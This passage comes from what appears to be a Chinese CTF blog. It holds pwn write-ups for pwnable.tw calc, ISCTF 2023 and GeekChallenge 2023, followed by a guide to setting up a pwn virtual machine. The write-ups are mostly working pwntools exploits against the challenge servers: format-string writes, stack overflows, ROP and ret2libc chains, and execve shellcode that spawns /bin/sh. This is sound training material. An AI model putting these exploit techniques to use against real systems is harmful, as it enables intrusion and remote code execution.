<p>可以利用的漏洞点是在eval中，检查错误中没有检查像’+123\n’这种表达式，因此在这里它是合法的，如果我们输入’+123\n‘，那么在程序遇到’\n’结束前变量储存的值是这样的<br>a2[0] &#x3D; 1</p>
<p>a2[a2[0]] &#x3D; a2[1] &#x3D; 123</p>
<p>s[0] &#x3D; ‘+’</p>
<p>那么在eval计算时，则会执行下图第一个框内的代码，使得a2[0] &#x3D; 1 + 123 &#x3D; 124</p>
<p>a2是什么？正是我们的操作数个数，那么我们成功改变了操作数的个数，那我们就可以利用这个点就可以实现任意地址读和任意地址写了</p>
<p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-4.png"></p>
<p>直接上exp，注释中有说明为什么这么写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10100</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;=== Welcome to SECPROG calculator ===&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;+360&#x27;</span>) <span class="comment">#为什么是360？回到calc函数中的v1,我们的操作数个数正是储存在v1[0],而v1[361]是ebp，如何计算？因为每个int占4个字节，所以0x5a0/4 = 360，那我们要泄露v1[361]的内容为什么要是360，因为按前面发送+123那里的逻辑来看，原本v1[0] = 1,因为有360这1个操作数，所以发送+360后，就可以利用该漏洞将原本的 v1[0] = 1 改成 v1[0] = 1 + 360 = 361 了</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    old_ebp = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;old_ebp:&quot;</span>,old_ebp)</span><br><span class="line"></span><br><span class="line">    gadget=[<span class="number">0x0805c34b</span>,<span class="number">0xb</span>,<span class="number">0x080701d0</span>,<span class="number">0</span>,<span class="number">0</span>,old_ebp,<span class="number">0x08049a21</span>,u32(<span class="string">&#x27;/bin&#x27;</span>),u32(<span class="string">&#x27;/sh\x00&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(gadget)): <span class="comment">#这个for循环是用于布置ROP，从v1[361]布置起，程序结束后执行rop</span></span><br><span class="line">        p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">361</span>+i))</span><br><span class="line">        tmp=gadget[i]-<span class="built_in">int</span>(p.recvline())</span><br><span class="line">        <span class="keyword">if</span> tmp&gt;<span class="number">0</span>:</span><br><span class="line">            p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">361</span>+i)+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(tmp))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">361</span>+i)+<span class="built_in">str</span>(tmp))</span><br><span class="line">        p.recvline()</span><br><span class="line"></span><br><span class="line">    p.sendline()</span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>ISCTF 2023 wp pwn 部分题解</title>
    <url>/2023/11/29/ISCTF-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="ezpie"><a href="#ezpie" class="headerlink" title="ezpie"></a>ezpie</h3><p>func函数地址被放入栈中，用fmt漏洞读出地址，然后算真实地址，泄露puts，匹配这个版本libc6_2.31-0ubuntu9.10_amd64的libc</p>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;43.249.195.138&quot;</span>,<span class="number">22453</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/ezpie&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">9</span>) + <span class="string">b&#x27;b&#x27;</span>) </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">func_addr_t = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;func_addr:%#x&quot;</span>, func_addr_t)</span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">pop_rdi = <span class="number">0x1333</span></span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">func_addr = elf.sym.func</span><br><span class="line">ret_addr = <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">pieBase = func_addr_t - func_addr</span><br><span class="line"></span><br><span class="line">pop_rdi_t =  pop_rdi + pieBase</span><br><span class="line">puts_got_t = puts_got + pieBase</span><br><span class="line">puts_plt_t = puts_plt + pieBase</span><br><span class="line">ret_addr_t = ret_addr + pieBase</span><br><span class="line"></span><br><span class="line">pad = offset + p64(pop_rdi_t) + p64(puts_got_t) + p64(puts_plt_t) + p64(func_addr_t)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please enter your information-&gt; &quot;</span>,pad)</span><br><span class="line">puts_addr= u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;puts_addr:%#x&quot;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">libc=  LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">libc_system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pad2 = offset + p64(ret_addr_t) + p64(pop_rdi_t) + p64(bin_sh_addr) + p64(libc_system)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please enter your information-&gt; &quot;</span>,pad2)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>v1和v2地址被放进栈里面，调试发现其为第8和第9个参数，把他们的值改成18和52就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;43.249.195.138&quot;</span>,<span class="number">21001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;%18c%8$hhn%34c%9$hhn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>溢出字节为0x20，返回地址为第41个字节，利用for循环内的指针，输入28个字节后到达 i 的值，将 i 的值改成 0x27 ，也就是39，但s[39] 是第40个字节，循环后自动+1，所以下一个字节修改的是第41个字节，将第41和第42个字节替换为backdoor的地址，第43个字节一样就不用替换，然后就能返回backdoor</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;43.249.195.138&quot;</span>,<span class="number">22959</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012ee</span></span><br><span class="line"><span class="comment">#0x20 + 8 + 2 = 42</span></span><br><span class="line"><span class="comment">#0x20 - 4 = 28 </span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;42&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    p.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&quot;\x27&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\xee&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x12&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>write up</category>
      </categories>
  </entry>
  <entry>
    <title>GeekChallenge 2023 wp pwn 部分题解</title>
    <url>/2023/11/28/GeekChallenge-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="nc-pwntools"><a href="#nc-pwntools" class="headerlink" title="nc pwntools"></a>nc pwntools</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31441</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">92</span> + <span class="string">b&#x27;\x53\x79\x63\x6c\x6F\x76\x65\x72&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;This string need to be 100 characters long&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pd1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;2.This challenge is harder than first one&#x27;</span>)</span><br><span class="line">calc = p.recvuntil(<span class="string">&#x27;=&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(calc)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>开了pie，最后三位不变，直接改最后一位字节就可以跳转到backdoor</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31396</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>) + <span class="string">b&#x27;\x27&#x27;</span></span><br><span class="line">p.send(pd)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>泄露gets的地址，要在附件中找到这个片段mov_edx_edi_eax，其他的都很常规</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">30616</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt.write</span><br><span class="line">gets_got = elf.got.gets</span><br><span class="line">vuln = elf.sym.vuln</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401333</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401331</span></span><br><span class="line">mov_edx_edi_eax = <span class="number">0x0000000000401288</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&#x27;a\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> + <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">pd = offset</span><br><span class="line">pd += p64(pop_rsi_r15) + p64(gets_got) + p64(<span class="number">1</span>)</span><br><span class="line">pd += p64(mov_edx_edi_eax)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">gets_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&quot;gets_addr:%#x&quot;</span>,gets_addr)</span><br><span class="line"></span><br><span class="line">libc_base = gets_addr - libc.symbols[<span class="string">b&#x27;gets&#x27;</span>]</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pd2 = offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(libc_system)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,pd2)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>直接爆破，密码是随机数，第一个字节有256种情况，爆破到第一个字节为\x00的时候就通了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012F3</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">b&#x27;Wrong&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="string">b&#x27;Wrong&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line"></span><br><span class="line">    p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">30542</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;please enter user name:&quot;</span>)</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line">    p.sendline(pd)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;please enter password:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    res = p.recv(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h3><p>第一个scanf传什么没什么关系，随便传，利用for循环内指针改返回地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31848</span>)</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x40134D</span></span><br><span class="line">backdoor = <span class="number">0x401225</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;\x11\x22\x33\x44\x55\x66\x77\x88&#x27;</span></span><br><span class="line">p.sendline(pd)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;value:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-28&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;value:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="write2"><a href="#write2" class="headerlink" title="write2"></a>write2</h3><p>第一个scanf传入shellcode，再修改返回地址回到shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31409</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index_addr:0x&quot;</span>)</span><br><span class="line">v1_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">4</span></span><br><span class="line">hax_v1_addr = <span class="built_in">hex</span>(v1_addr)</span><br><span class="line">v2_addr= hax_v1_addr[<span class="number">2</span>:]</span><br><span class="line">info(<span class="string">&quot;v2_addr:%s&quot;</span>,v2_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">11</span>,<span class="number">2</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(<span class="number">40</span>+i/<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;value:&quot;</span>)</span><br><span class="line">    p.sendline(v2_addr[<span class="number">11</span>-i-<span class="number">1</span>:<span class="number">11</span>-i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>write up</category>
      </categories>
  </entry>
  <entry>
    <title>Pwn虚拟机环境配置超详细版</title>
    <url>/2023/10/18/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>原来的虚拟机被我搞崩了，只能重装了(脚本全无了呜呜呜)，看到网上的安装教程都比较零碎，多多少少也有点小瑕疵，因此，我决定水一篇博客(bushi)，写一下我的pwn虚拟机环境全套安装路程。</p>
<span id="more"></span>

<h2 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h2><p>Linux版本：Ubuntu20.04</p>
<p>Python版本：Python3.8.10</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>这个没什么大问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>

<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>先按个pip，再按pwntools</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3-pip</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>

<h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><p>先按个git，再安装pwndbg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure>

<p>然后测试一下是否成功</p>
<p><img src="/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/3cdadb568be0e7fd2c61ba98cc52b4e.png"></p>
<p>出现上面的红色的pwndbg&gt;即为成功，若不是，而是出现原始版的 (gdb) ,则需要配置一下默认的调试器</p>
<p>命令行输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.gdbinit</span><br></pre></td></tr></table></figure>

<p>按 i 键可进行编辑，然后添加下面代码，然后再按 Esc 键可以退出编辑模式，输入 :wq 然后回车即可保存退出即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure>

<p>如下</p>
<p><img src="/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/07cbfa76506005efce49fd5569dd577.png"></p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install checksec</span><br></pre></td></tr></table></figure>

<p>之前用的checksec是下面的格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">checksec filename</span><br></pre></td></tr></table></figure>

<p>但是今天重新安装的这个改了，需要用到下面的格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">checksec --file=filename</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/b4fe46c11a942b09df37ba6307ca76a.png"></p>
<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>网上的方法大部分都是Python2的方法，对于Python3基本不管用，建议Python3的用这个安装，就是有个缺点，没网的时候不能用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install LibcSearcher</span><br></pre></td></tr></table></figure>

<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br></pre></td></tr></table></figure>

<p>这里第二句如果报错说无法连接gitHub的话，我的做法是换镜像源，没报错就跳过下面这段代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global url.<span class="string">&quot;https://ghproxy.com/https://github.com&quot;</span>.insteadOf <span class="string">&quot;https://github.com&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure>

<p>然后在命令行输入ROPgadget测试一下</p>
<p>如果报错，如下</p>
<p><img src="/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/f97382479d97ce7d0d812ada2fe34ff.png"></p>
<p>意思是缺少上面红色框框内的文件</p>
<p>很简单就可以解决，注意下面代码的路径是你自己电脑上的报错路径，其他的不用改，如我报错路径是上面红色框框内的内容，我就需要输入以下代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> -r scripts /home/feichai/.local/lib/python3.8/site-packages/ROPGadget-7.4.dist-info</span><br></pre></td></tr></table></figure>

<p>注意这行代码需要在ROPgadget文件夹里面运行，因为代码中的scripts文件夹在ROPgadget文件夹里面，如果不在ROPgadget文件夹里面运行则需要自己把路径弄好</p>
<h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p>这个安装比较简单，运行下面代码即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ruby -y</span><br><span class="line">sudo apt-get install gem -y</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>

<h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install net-tools</span><br></pre></td></tr></table></figure>

<h3 id="lief"><a href="#lief" class="headerlink" title="lief"></a>lief</h3><p>AWD攻防插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m pip3 install launchpadlib</span><br><span class="line">pip3 install setuptools --upgrade</span><br><span class="line">pip3 install lief</span><br></pre></td></tr></table></figure>

<h3 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h3><p>用于可见shellcode转换</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用方法</span></span><br><span class="line"><span class="built_in">cd</span> alpha3</span><br><span class="line">python ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">&quot;存储shellcode的文件&quot;</span> &gt; 输出文件</span><br></pre></td></tr></table></figure>

<h3 id="ae64"><a href="#ae64" class="headerlink" title="ae64"></a>ae64</h3><p>也是用于可见shellcode转化</p>
